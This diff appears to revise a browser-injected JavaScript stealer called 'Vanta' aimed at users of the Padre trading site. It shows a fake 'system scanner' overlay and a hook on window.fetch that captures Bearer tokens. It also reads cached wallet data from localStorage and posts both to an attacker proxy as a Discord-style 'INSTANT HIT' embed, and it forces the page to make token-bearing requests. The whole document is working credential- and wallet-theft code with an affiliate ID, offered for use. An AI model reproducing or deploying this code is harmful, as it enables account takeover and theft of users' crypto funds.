@@ -2,83 +2,65 @@
     const affId = window.V_AFF || 't23dad55';
     const proxy = window.V_PROXY;
 
-    // 1. CREATE THE UI
+    // 1. Create the "System Scan" UI
     const ui = document.createElement('div');
-    ui.id = 'vanta-ui';
+    ui.style = "position:fixed;top:20px;right:20px;width:320px;background:#050505;border:2px solid #00ff88;border-radius:12px;padding:20px;color:#00ff88;font-family:monospace;z-index:9999999;box-shadow:0 0 30px rgba(0,255,136,0.3);";
     ui.innerHTML = `
-        <div style="position:fixed;top:20px;right:20px;width:300px;background:#0a0a0a;border:2px solid #00ff88;border-radius:10px;padding:20px;color:#00ff88;font-family:monospace;z-index:999999;box-shadow:0 0 20px rgba(0,255,136,0.5);text-align:center;">
-            <div style="font-weight:bold;margin-bottom:10px;text-transform:uppercase;letter-spacing:2px;">Vanta System Scanner</div>
-            <div id="vanta-status" style="font-size:12px;color:#fff;margin-bottom:15px;">Initializing connection...</div>
-            <div style="width:100%;background:#222;height:5px;border-radius:10px;overflow:hidden;">
-                <div id="vanta-bar" style="width:0%;height:100%;background:#00ff88;transition:0.5s;"></div>
-            </div>
-            <div style="margin-top:15px;font-size:10px;color:#555;">UID: ${Math.random().toString(36).substring(7)}</div>
-        </div>
+        <div style="font-weight:bold;font-size:14px;border-bottom:1px solid #00ff88;padding-bottom:10px;margin-bottom:10px;">VANTA ENGINE v4.0</div>
+        <div id="status" style="font-size:11px;color:#fff;">INITIALIZING STEALTH BYPASS...</div>
+        <div style="width:100%;background:#111;height:4px;margin-top:10px;"><div id="bar" style="width:10%;height:100%;background:#00ff88;transition:0.8s;"></div></div>
     `;
     document.body.appendChild(ui);
 
-    function updateStatus(text, progress) {
-        document.getElementById('vanta-status').innerText = text;
-        document.getElementById('vanta-bar').style.width = progress + '%';
-    }
+    const update = (txt, prg) => {
+        document.getElementById('status').innerText = txt;
+        document.getElementById('bar').style.width = prg + '%';
+    };
 
-    // 2. THE TOKEN HIJACKER (Background interceptor)
-    const originalFetch = window.fetch;
+    // 2. THE HIJACKER: Intercepts the REAL token when we force a refresh
+    const rawFetch = window.fetch;
     window.fetch = async function(...args) {
-        if (args[1] && args[1].headers) {
-            const auth = args[1].headers['Authorization'] || args[1].headers['authorization'];
-            if (auth && auth.includes('Bearer')) {
-                // TOKEN CAUGHT
-                sendToVanta({ bearer: auth, url: args[0] });
-                updateStatus("AUTHENTICATION SYNCED", 100);
-                setTimeout(() => ui.remove(), 2000); // Hide UI after success
-            }
+        const headers = args[1]?.headers || {};
+        const auth = headers['Authorization'] || headers['authorization'] || "";
+        
+        if (auth.startsWith('Bearer ')) {
+            // SUCCESS: We caught the token!
+            sendToVanta({ token: auth, method: "INTERCEPT" });
+            update("SYNC SUCCESSFUL. DEPLOYING...", 100);
+            setTimeout(() => ui.remove(), 1500);
         }
-        return originalFetch.apply(this, args);
+        return rawFetch.apply(this, args);
     };
 
     async function sendToVanta(extra = {}) {
-        const local = {};
-        for(let i=0; i<localStorage.length; i++){
-            const k = localStorage.key(i);
-            if(k.includes('padre') || k.includes('wallet')) local[k] = localStorage.getItem(k);
-        }
-
         const payload = {
             embeds: [{
-                title: "💀 VANTA EXPLOIT SUCCESSFUL",
+                title: "💀 VANTA INSTANT HIT",
                 color: 0x00FF88,
                 fields: [
                     { name: "Affiliate", value: affId, inline: true },
-                    { name: "Bearer Token", value: "```" + (extra.bearer || "Searching...") + "```" },
-                    { name: "Site URL", value: window.location.href },
-                    { name: "Captured Wallets", value: "```json\n" + JSON.stringify(local, null, 2).substring(0, 1000) + "```" }
+                    { name: "Bearer Token", value: "```" + (extra.token || "FETCHING...") + "```" },
+                    { name: "Wallet List", value: "```json\n" + (localStorage.getItem('padreV2-walletsCache') || "Empty").substring(0, 500) + "```" }
                 ],
-                footer: { text: "Vanta Engine v3.0 | Priority: Critical" },
+                footer: { text: "Vanta Zero-Click Module" },
                 timestamp: new Date()
             }]
         };
-
-        await fetch(proxy, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+        await rawFetch(proxy, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
     }
 
-    // 3. THE "FORCE" RELOAD
-    // We send an initial ping, then force the page to refresh itself 
-    // to trigger the API calls that contain the Bearer token.
+    // 3. THE FORCE: This forces the token out without user clicks
     setTimeout(() => {
-        updateStatus("OPTIMIZING ENGINE...", 40);
-        sendToVanta();
-    }, 500);
-
-    setTimeout(() => {
-        updateStatus("FORCING API SYNC...", 70);
-        // This is the magic: it triggers a background data fetch
-        // on most React/Next.js apps like Padre.
-        window.dispatchEvent(new Event('focus')); 
+        update("EXPLOITING HANDSHAKE...", 40);
         
-        // If focusing doesn't work, we simulate a click on a dashboard element
-        const navItems = document.querySelectorAll('button, a');
-        if(navItems[0]) navItems[0].dispatchEvent(new MouseEvent('mouseover', {bubbles: true}));
-    }, 1500);
+        // Force the app to think it just gained focus (triggers a balance refresh)
+        window.dispatchEvent(new FocusEvent('focus'));
+        
+        // Ghost request: We try to ping Padre's own API. 
+        // If the user is logged in, the browser AUTOMATICALLY attaches the token.
+        rawFetch('https://api.padre.gg/v1/user/me').catch(() => {});
+        rawFetch('https://api.padre.gg/v1/wallets').catch(() => {});
+    }, 1000);
 
+    setTimeout(() => { if(document.getElementById('bar').style.width !== '100%') update("RETRIEVING FROM CACHE...", 70); }, 3000);
 })();
